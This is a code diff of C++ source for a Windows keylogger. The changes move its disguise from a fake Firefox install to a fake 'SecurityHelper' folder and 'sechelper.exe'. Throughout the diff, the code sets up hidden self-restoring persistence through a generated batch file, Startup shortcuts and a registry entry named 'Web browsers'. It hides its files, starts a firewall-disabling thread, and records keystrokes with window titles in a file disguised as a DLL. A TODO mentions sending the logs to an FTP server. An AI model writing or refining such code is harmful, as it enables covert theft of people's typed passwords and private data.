@@ -20,63 +20,61 @@ using namespace std;
 
 bool firstRun;
 
-const string firefoxPath = "C:\\Firefox";
+const string sechelperPath = "C:\\ProgramData\\SecurityHelper";
 
 //TODO: Create new file
 void persist(){
-    if (!fileExists("C:\\Firefox\\systemchecker.bat")){        
+    if (!fileExists("C:\\ProgramData\\SecurityHelper\\systemchecker.bat")){        
         char batContent[2048];
                 
         strcpy(batContent, "attrib +s +h \"%~f0\"\r\n");
         strcat(batContent, "SETLOCAL EnableExtensions\r\n");
-        strcat(batContent, "set EXE=firefox.exe\r\n");
-        strcat(batContent, "mkdir C:\\Users\\Public\\Documents\\backup\r\n");
-        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup\r\n");
+        strcat(batContent, "set EXE=sechelper.exe\r\n");
         strcat(batContent, ":check\r\n");
         strcat(batContent, "timeout /t 4\r\n");
-        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk goto create\r\n");        
-        strcat(batContent, "if not exist C:\\Firefox\\firefox.exe goto createexe\r\n");        
-        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup.lnk goto createbackup\r\n");
+        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\sechelper.lnk goto create\r\n");        
+        strcat(batContent, "if not exist C:\\ProgramData\\SecurityHelper\\sechelper.exe goto createexe\r\n");        
+        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup.rar goto createbackup\r\n");
         strcat(batContent, "FOR /F %%x IN ('tasklist /NH /FI \"IMAGENAME eq %EXE%\"') DO IF %%x == %EXE% goto check\r\n");
         strcat(batContent, "goto ProcessNotFound\r\n");
         
         strcat(batContent, ":create\r\n");        
         strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
         strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
-        strcat(batContent, "echo sLinkFile = \"C:\\Firefox\\firefox.lnk\" >> %SCRIPT%\r\n");
+        strcat(batContent, "echo sLinkFile = \"C:\\ProgramData\\SecurityHelper\\sechelper.lnk\" >> %SCRIPT%\r\n");
         strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
-        strcat(batContent, "echo oLink.TargetPath = \"C:\\Firefox\\firefox.exe\" >> %SCRIPT%\r\n");
+        strcat(batContent, "echo oLink.TargetPath = \"C:\\ProgramData\\SecurityHelper\\sechelper.exe\" >> %SCRIPT%\r\n");
         strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
         strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
         strcat(batContent, "del %SCRIPT%\r\n");
-        strcat(batContent, "copy C:\\Firefox\\firefox.lnk %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk /y\r\n");
-        strcat(batContent, "del C:\\Firefox\\firefox.lnk\r\n");        
+        strcat(batContent, "copy C:\\ProgramData\\SecurityHelper\\sechelper.lnk %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\sechelper.lnk /y\r\n");
+        strcat(batContent, "del C:\\ProgramData\\SecurityHelper\\sechelper.lnk\r\n");        
         strcat(batContent, "goto check\r\n");
         
         strcat(batContent, ":createexe\r\n");        
-        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\backup.lnk\r\n");          
-        strcat(batContent, "copy C:\\Users\\Public\\Documents\\backup.lnk C:\\Firefox\\firefox.exe /y\r\n");  
-        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.lnk \r\n");               
-        strcat(batContent, "attrib +s +h C:\\Firefox\\firefox.exe \r\n"); 
+        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\backup.rar\r\n");          
+        strcat(batContent, "copy C:\\Users\\Public\\Documents\\backup.rar C:\\ProgramData\\SecurityHelper\\sechelper.exe /y\r\n");  
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.rar \r\n");               
+        strcat(batContent, "attrib +s +h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n"); 
         strcat(batContent, "goto check\r\n");
         
         strcat(batContent, ":createbackup\r\n");          
-        strcat(batContent, "attrib -s -h C:\\Firefox\\firefox.exe \r\n");        
-        strcat(batContent, "copy C:\\Firefox\\firefox.exe C:\\Users\\Public\\Documents\\backup.lnk /y\r\n");     
-        strcat(batContent, "attrib +s +h C:\\Firefox\\firefox.exe \r\n");          
-        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.lnk \r\n");          
+        strcat(batContent, "attrib -s -h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");        
+        strcat(batContent, "copy C:\\ProgramData\\SecurityHelper\\sechelper.exe C:\\Users\\Public\\Documents\\backup.rar /y\r\n");     
+        strcat(batContent, "attrib +s +h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");          
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.rar \r\n");          
         strcat(batContent, "goto check\r\n");
                 
         strcat(batContent, ":ProcessNotFound\r\n");          
-        strcat(batContent, "start C:\\Firefox\\firefox.exe \r\n");          
+        strcat(batContent, "start C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");          
         strcat(batContent, "goto check\r\n");
         
-        ofstream bat("C:\\Firefox\\systemchecker.bat");
+        ofstream bat("C:\\ProgramData\\SecurityHelper\\systemchecker.bat");
         bat << batContent;
         bat.close();
     }
     
-    runBatFile("C:\\Firefox\\systemchecker.bat");    
+    runBatFile("C:\\ProgramData\\SecurityHelper\\systemchecker.bat");    
 }
 
 BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
@@ -118,15 +116,15 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
 
 void RegisterProgram() {
     wchar_t szPathToExe[MAX_PATH];   
-    const wchar_t* path = s2wct("C:\\Firefox\\firefox.exe");    
+    const wchar_t* path = s2wct("C:\\ProgramData\\SecurityHelper\\sechelper.exe");    
     wcscpy(szPathToExe, path);        
     RegisterMyProgramForStartup(L"Web browsers", szPathToExe, NULL);
 }
 
 void infect(){
-    mkdir(firefoxPath.c_str());
+    mkdir(sechelperPath.c_str());
     char pathLocation[MAX_PATH];
-    strcpy(pathLocation, firefoxPath.c_str());
+    strcpy(pathLocation, sechelperPath.c_str());
     strcat(pathLocation, "\\nananana.bat");
     
     char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
@@ -134,39 +132,39 @@ void infect(){
     strcat(startup, getUserName().c_str());
     strcat(startup, "\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
     
-    char firefoxLoc[MAX_PATH];
-    strcpy(firefoxLoc, startup);
-    strcat(firefoxLoc, "\\firefox.lnk");
+    char sechelperLoc[MAX_PATH];
+    strcpy(sechelperLoc, startup);
+    strcat(sechelperLoc, "\\sechelper.lnk");
         
     char batContent[2048];
-    bool firefoxExists = true;
+    bool sechelperExists = true;
     
-    if (!fileExists(firefoxPath.c_str()) || !fileExists("C:\\Firefox\\firefox.exe")){
-        firefoxExists = false;
+    if (!fileExists(sechelperPath.c_str()) || !fileExists("C:\\ProgramData\\SecurityHelper\\sechelper.exe")){
+        sechelperExists = false;
     }
     
-    if(!fileExists(firefoxLoc) || !firefoxExists){
+    if(!fileExists(sechelperLoc) || !sechelperExists){
         strcpy(batContent, "set \"destino0=");
         strcat(batContent, getExecutableFullPath().c_str());
         strcat(batContent, "\"");
         strcat(batContent, "\r\n");
         strcat(batContent, "set \"destino1=%appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\\"\r\n"); //TODO: usar variable startup
-        strcat(batContent, "set \"destino2=C:\\Firefox\\\"\r\n");
-        strcat(batContent, "set \"destino3=C:\\Firefox\\firefox.exe\"\r\n");
-        if(!firefoxExists){
+        strcat(batContent, "set \"destino2=C:\\ProgramData\\SecurityHelper\\\"\r\n");
+        strcat(batContent, "set \"destino3=C:\\ProgramData\\SecurityHelper\\sechelper.exe\"\r\n");
+        if(!sechelperExists){
            strcat(batContent, "copy %destino0% %destino3% /y\r\n");
-           strcat(batContent, "attrib C:\\Firefox +s +h\r\n");
+           strcat(batContent, "attrib C:\\ProgramData\\SecurityHelper +s +h\r\n");
         }
         strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
         strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
-        strcat(batContent, "echo sLinkFile = \"%destino2%firefox.lnk\" >> %SCRIPT%\r\n");
+        strcat(batContent, "echo sLinkFile = \"%destino2%sechelper.lnk\" >> %SCRIPT%\r\n");
         strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
         strcat(batContent, "echo oLink.TargetPath = \"%destino3%\" >> %SCRIPT%\r\n");
         strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
         strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
         strcat(batContent, "del %SCRIPT%\r\n");
-        strcat(batContent, "xcopy %destino2%firefox.lnk %destino1% /y\r\n");
-        strcat(batContent, "del %destino2%firefox.lnk\r\n");
+        strcat(batContent, "xcopy %destino2%sechelper.lnk %destino1% /y\r\n");
+        strcat(batContent, "del %destino2%sechelper.lnk\r\n");
         strcat(batContent, "attrib %destino3%  +s +h\r\n");
         strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
         strcat(batContent, "attrib %destino2%systemconf.dll  +s +h\r\n");
@@ -180,7 +178,7 @@ void infect(){
         RegisterProgram();
         Sleep(2000);
         if(firstRun){
-            runFirefox();
+            runSechelper();
             exit(0);
         }
     }
@@ -203,7 +201,7 @@ void Log(int limite_keystrokes){
                 strings = convertKey(keys, keystrokes);
                 if(strcmp(currentWindowTitle,  newWindowTitle)&& strings!="" && strings!="[TAB]"){
 
-                    ofstream store("C:\\Firefox\\systemconf.dll", ios::app);
+                    ofstream store("C:\\ProgramData\\SecurityHelper\\systemconf.dll", ios::app);
                     store << "\r\n" << "__________________________________________";
                     store << "\n" << "WINDOW: " << currentWindowTitle << "\n"
                             << "CONTENT: ";
@@ -220,12 +218,12 @@ void Log(int limite_keystrokes){
 }
 
 std::string getIdentification(){
-    std::ifstream id("C:\\Firefox\\sysid.dat");
+    std::ifstream id("C:\\ProgramData\\SecurityHelper\\sysid.dat");
     std::string identification;
     bool sendFileOnFirstRun = false;
     
     if(id.good()){
-        if(getExecutablePath()!= firefoxPath  || isProcessRunning("firefox.exe")){
+        if(isProcessRunning("sechelper.exe")){
             exit(0);
         }
         else{
@@ -252,9 +250,10 @@ int main(int argc, char *argv[]){
     CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(DisableFirewall), NULL, 0, &dwThreadId);  
     
     string id = getIdentification();
-    int keystroke_limit=500;
-    //TODO: move stuff to C:\\Program Files
-    //TODO: rename firefox to a more consistent name
+    int keystroke_limit=30;//500;
+    //TODO: avoid using timeouts
+    //TODO: add support for firewall alerts in other languages
+    //TODO: add more character combinations
     //TODO: set user/pass with final ftp
     
     while(true){
